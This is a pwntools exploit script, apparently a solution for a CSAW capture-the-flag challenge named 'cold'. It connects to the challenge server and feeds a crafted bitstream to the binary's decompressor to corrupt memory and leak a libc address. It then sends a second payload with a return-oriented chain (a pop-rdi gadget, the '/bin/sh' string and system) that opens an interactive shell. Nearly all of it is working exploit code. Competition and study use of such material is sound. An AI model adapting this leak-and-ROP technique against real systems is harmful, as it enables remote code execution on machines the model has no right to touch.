from pwn import *

libc = ELF("./libc.so.6")

#p = process("./cold")
p = remote("pwn.chal.csaw.io", 5005)

#gdb.attach(p)

data = []

def write(x, sz):
  for i in range(sz):
    idx = sz - 1 - i
    if (x & (1 << idx)) != 0:
      data.append(1)
    else:
      data.append(0)

def op8(x):
  write(2, 3)
  write(x, 8)

def op1(x):
  write(1, 3)
  write(x, 1)

def seek(x):
  write(4, 3)
  write(x, 0x10)

def copy(offset, amt):
  write(3, 3)
  write(offset, 10)
  write(amt, 10)

write(0x10 - 1, 0x14)
#write(4, 3)
#write(1000, 0x10)

for i in range(8):
  op8(0)
for i in range(6):
  op8(0xff)

write(3, 3)
write(1, 10)
write(5 * 8, 10)

seek(0x50 * 8 - 0x98)

write(3, 3)
write(0x18 * 8, 10)
write(8 * 8, 10)

seek(0x10000 - 0x2c0)

offset = 0x70 - 8 * 8
for i in range(8):
  copy(offset * 8, 1)
  for j in range(7):
    copy(offset * 8 + 8, 1)

write(0, 3)

#gdb.attach(p, "b decompress")

def serialize(data):
  while len(data) % 8 != 0:
    data.append(0)

  pay = []
  for i in range(len(data) // 8):
    curr = 0
    for j in range(8):
      curr |= data[8 * i + j] * (1 << j)

    pay.append(curr)
  return bytes(pay)

p.sendlineafter(":", serialize(data))

p.recvuntil("Output: ")
leak = u64(p.recvline(keepends=False)[:8].ljust(8, b"\x00")) -  0x00007fdc3c88c3be   + 0x7fdc3c802000
print(hex(leak))

data = []

write(0x10 - 1, 0x14)
#write(4, 3)
#write(1000, 0x10)

for i in range(8):
  op8(0)
for i in range(6):
  op8(0xff)

write(3, 3)
write(1, 10)
write(5 * 8, 10)

seek(0x50 * 8 - 0x98)

prdi = 0x00083c1a
pay = p64(leak + prdi) + p64(leak + next(libc.search(b"/bin/sh"))) + p64(leak + libc.symbols["system"])

for i in range(len(pay)):
  op8(pay[i])

write(0, 3)

p.sendlineafter(":", serialize(data))

p.interactive()
